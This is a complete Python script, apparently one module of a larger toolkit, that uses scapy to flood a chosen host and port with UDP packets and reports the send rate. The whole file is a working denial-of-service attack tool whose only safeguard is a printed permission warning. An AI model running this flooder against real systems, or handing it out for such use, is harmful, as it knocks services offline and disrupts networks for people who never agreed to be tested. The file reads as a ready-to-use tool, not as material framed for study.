#!/usr/bin/env python3
"""
UDP Flooder Module
UDP-based flood tool targeting specific ports/services
"""

import os
import sys
import time
import random
import signal

try:
    from scapy.all import IP, UDP, Raw, send
except ImportError:
    print("Error: scapy not installed")
    sys.exit(1)

def main():
    target = os.getenv('ARG_TARGET')
    port = int(os.getenv('ARG_PORT'))
    count = int(os.getenv('ARG_COUNT', '1000'))
    payload_size = int(os.getenv('ARG_PAYLOAD_SIZE', '512'))
    
    if not target or not port:
        print("Error: target and port required")
        sys.exit(1)
    
    print(f"[!] WARNING: This tool can cause serious network issues")
    print(f"[!] Only use on systems you own or have permission to test")
    print(f"\n[*] UDP Flooder for {target}:{port}")
    print(f"[*] Count: {count}, Payload: {payload_size}B")
    
    sent = 0
    start_time = time.time()
    
    def signal_handler(sig, frame):
        elapsed = time.time() - start_time
        rate = sent / elapsed if elapsed > 0 else 0
        print(f"\n[+] Sent {sent} packets in {elapsed:.2f}s ({rate:.0f} pps)")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        print(f"\n[*] Starting UDP flood...")
        
        for i in range(count):
            src_port = random.randint(49152, 65535)
            payload = b'A' * payload_size
            
            packet = IP(dst=target)/UDP(sport=src_port, dport=port)/Raw(load=payload)
            send(packet, verbose=False)
            
            sent += 1
            if (i + 1) % 100 == 0:
                print(f"[+] Sent {i + 1}/{count} packets", end='\r')
        
        elapsed = time.time() - start_time
        rate = sent / elapsed if elapsed > 0 else 0
        
        print(f"\n[+] Complete!")
        print(f"[+] Sent {sent} packets in {elapsed:.2f}s ({rate:.0f} pps)")
    except PermissionError:
        print("Error: This requires root/administrator privileges")
        sys.exit(1)
    except Exception as e:
        print(f"\nError: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
